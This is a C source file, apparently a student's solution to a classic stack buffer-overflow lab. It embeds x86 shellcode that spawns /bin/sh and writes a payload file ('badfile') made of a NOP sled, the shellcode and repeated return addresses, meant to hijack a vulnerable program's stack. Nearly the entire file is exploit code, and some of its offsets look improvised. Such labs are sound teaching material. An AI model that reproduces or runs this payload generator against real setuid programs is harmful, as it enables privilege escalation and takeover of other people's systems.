/* exploit.c  */

/* A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define BUFFER_SIZE 512

char shellcode[]=
    "\x31\xc0"             /* xorl    %eax,%eax              */
    "\x50"                 /* pushl   %eax                   */
    "\x68""//sh"           /* pushl   $0x68732f2f            */
    "\x68""/bin"           /* pushl   $0x6e69622f            */
    "\x89\xe3"             /* movl    %esp,%ebx              */
    "\x50"                 /* pushl   %eax                   */
    "\x53"                 /* pushl   %ebx                   */
    "\x89\xe1"             /* movl    %esp,%ecx              */
    "\x99"                 /* cdql                           */
    "\xb0\x0b"             /* movb    $0x0b,%al              */
    "\xcd\x80"             /* int     $0x80                  */
;

void main(int argc, char **argv)
{
	int shellcode_length = strlen(shellcode);
    char buffer[BUFFER_SIZE];
	const int noops_length = (BUFFER_SIZE - shellcode_length) / 2;

    FILE *badfile;

    /* Initialize buffer with 0x90 (NOP instruction) */
    //memset(&buffer, 0x90, BUFFER_SIZE);

    /* You need to fill the buffer with appropriate contents here */ 
	//bottom of page 18

	//size_t ndx = BUFFER_SIZE - sizeof(shellcode) / 2;
	//memcpy(&buffer[ndx], shellcode, sizeof(shellcode));
#if 0
	memset(&buffer, 0x90, noops_length * sizeof(char));
	memcpy(&buffer[noops_length], shellcode, sizeof(shellcode));
	memset(&buffer[noops_length + shellcode_length], (int)&buffer[noops_length], noops_length * sizeof(char));
#endif
	const int ret_address_cnt = 10;
	size_t shell_ndx = BUFFER_SIZE - sizeof(shellcode);
	size_t noop_ndx = ret_address_cnt - sizeof( char * );
	size_t noop_len = shell_ndx - noop_ndx;

	memset(&buffer[noop_ndx], 0x90, noop_len);
	memcpy(&buffer[shell_ndx], shellcode, sizeof(shellcode));
	char **ptr = (char **)buffer;
	for ( int ndx = 0; ret_address_cnt > ndx; ++ndx ) {
		// Choose random address near top of stack to start
		// looking for NOP instructions.
		ptr[ ndx ] = &buffer[164];
		//ptr[ ndx ] = (char*)0xbffff2cb;

	}
	printf("&buffer[shell_ndx]: %p\n", &buffer[shell_ndx]);
	printf("shell code length: %d\n", strlen(shellcode));
	printf("shell_ndx: %d\n", shell_ndx);
	printf("buffer: %p\n", buffer);

    /* Save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    if ( badfile == (FILE *)0 ) {
        perror( "fopen failed" );
        return;
    }
    fwrite(buffer, BUFFER_SIZE, 1, badfile);
    fclose(badfile);
}

